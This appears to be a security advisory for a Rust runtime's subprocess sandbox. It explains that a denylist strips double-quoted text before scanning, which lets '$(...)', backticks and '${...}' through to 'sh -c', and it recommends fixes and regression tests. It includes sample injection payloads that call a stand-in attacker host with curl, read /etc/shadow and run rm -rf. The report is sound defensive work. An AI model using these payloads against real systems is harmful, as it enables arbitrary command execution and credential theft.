# Shell-metacharacter denylist bypassed by command substitution inside double quotes

**Severity:** High
**Category:** Command injection, SSRF, sandbox
**Labels:** `security`, `sandbox`, `command-injection`, `high`

## Affected files
- `crates/librefang-runtime/src/subprocess_sandbox.rs:99-146` (denylist `contains_shell_metacharacters`)
- `crates/librefang-runtime/src/subprocess_sandbox.rs:148-194` (`strip_quoted_regions`)
- Duplicate implementation: `crates/librefang-runtime-sandbox-docker/src/lib.rs:699-732`, `:734-772`
- Consumers: `crates/librefang-runtime/src/tool_exec_backend.rs:296-298`, `crates/librefang-runtime-sandbox-docker/src/lib.rs:183-188`

## Description

`contains_shell_metacharacters` first strips the contents of `"..."`, then scans for `$( )`, backticks, and `${ }`.

**The problem**: `sh -c` / `bash -c` **still expand** command substitution and variable expansion inside double quotes. The existing test at `subprocess_sandbox.rs:1230-1236` even asserts that `echo "a && b"` is "clean" — under the same logic, every one of the following inputs slips through:

```sh
echo "$(curl https://attacker.example/x)"
cat "$(cat /etc/shadow)"
echo "${IFS}rm -rf /tmp/foo${IFS}"
```

The string is ultimately handed to `sh -c` verbatim at `tool_exec_backend.rs:296-298`. In allowlist mode, the attacker only needs the **outer** binary (`echo`, `cat`) to be on the allowlist to achieve arbitrary command execution.

## Recommendation

The three sequences `` ` ``, `$(`, and `${` are interpreted **unconditionally** inside double quotes — they must be scanned against the **raw string**, never after stripping. The quote-stripping channel should be reserved for `>`, `<`, `;`, `|`, `&`, `{`, `}` — characters that are only meaningful **outside** quoting.

Regression tests:

```rust
assert!(contains_shell_metacharacters("echo \"$(id)\"").is_some());
assert!(contains_shell_metacharacters("echo \"`id`\"").is_some());
assert!(contains_shell_metacharacters("echo \"${IFS}id\"").is_some());
```
